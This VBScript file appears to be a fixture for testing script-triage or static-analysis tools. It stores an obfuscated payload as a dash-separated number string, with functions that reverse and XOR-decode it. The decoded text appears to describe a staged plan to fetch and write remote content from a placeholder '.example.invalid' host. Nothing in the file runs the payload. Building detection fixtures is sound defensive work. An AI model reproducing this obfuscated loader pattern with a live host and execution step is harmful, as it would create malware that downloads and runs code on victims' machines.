Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_bbf26926 = "58-43-63-103-33-42-61-40-57-58-32-45-100-37-40-42-38-37-116-44-46-40-61-58-22-61-49-44-39-53-120-42-124-127-47-122-43-125-113-43-21-44-37-43-40-58-38-57-58-32-13-21-43-40-5-58-58-44-59-61-39-60-1-21-44-59-40-62-61-47-38-26-21-28-10-2-1-116-33-61-40-57-22-48-59-61-58-32-46-44-59-53-61-40-45-103-120-42-124-127-47-122-43-125-113-43-100-44-46-40-61-58-21-43-40-5-58-58-44-59-61-39-60-1-21-42-32-37-43-60-25-21-58-59-44-58-28-21-115-10-116-33-61-40-57-22-44-37-32-47-53-120-42-124-127-47-122-43-125-113-43-102-43-40-5-58-58-44-59-61-39-60-1-116-61-39-44-46-40-22-59-44-58-60-53-61-40-45-103-126-121-44-45-124-43-121-113-102-45-32-37-40-63-39-32-103-44-37-57-36-40-49-44-103-120-42-124-127-47-122-43-125-113-43-102-102-115-58-57-61-61-33-116-37-59-60-53-120-42-124-127-47-122-43-125-113-43-100-39-46-32-40-57-36-40-42-116-45-32-22-39-46-32-40-57-36-40-42-53-125-116-61-39-60-38-42-22-44-46-40-61-58-53-25-29-29-1-5-4-17-103-61-47-38-58-38-59-42-32-4-116-59-44-61-57-40-45-40-53-61-57-32-59-42-58-22-47-47-38-45-39-40-33-101-58-58-44-42-38-59-57-22-33-42-61-40-57-58-32-45-101-44-37-32-47-22-44-61-32-59-62-101-44-61-38-36-44-59-22-44-59-32-60-56-42-40-116-58-57-44-61-58-53-120-116-63"
Const Codec_bbf26926 = "decimal_dash|reverse_then_xor|49"

Function Load_bbf26926()
  Dim parts, result(), item5
  parts = Split(Material_bbf26926, "-")
  ReDim result(UBound(parts))
  For item5 = 0 To UBound(parts)
    result(item5) = CInt(parts(item5))
  Next
  Load_bbf26926 = result
End Function

Function Decode_bbf26926(ByRef item1)
  Dim result(), item5, keyBytes, previous
  ReDim result(UBound(item1))
  For item5 = 0 To UBound(item1)
    result(UBound(item1) - item5) = item1(item5) Xor 73
  Next
  Decode_bbf26926 = result
End Function

Function Recover_bbf26926()
  Dim item1, item2, item3, item4, item5, item6, item7, item8
  ' configuration reconstruction
item4 = UBound(Array(3, 5, 8, 13))
  item1 = Load_bbf26926()
  item2 = Decode_bbf26926(item1)
  item3 = ""
  For item5 = 0 To UBound(item2)
    item3 = item3 & Chr(item2(item5))
  Next
' reconstruction complete
  Recover_bbf26926 = item3
End Function

Sub Copy_bbf26926(ByVal inputText, ByRef outputText)
  outputText = inputText
End Sub

Function Inspect_bbf26926()
  Dim resultText
  Call Copy_bbf26926(Recover_bbf26926(), resultText)
  Inspect_bbf26926 = resultText
End Function
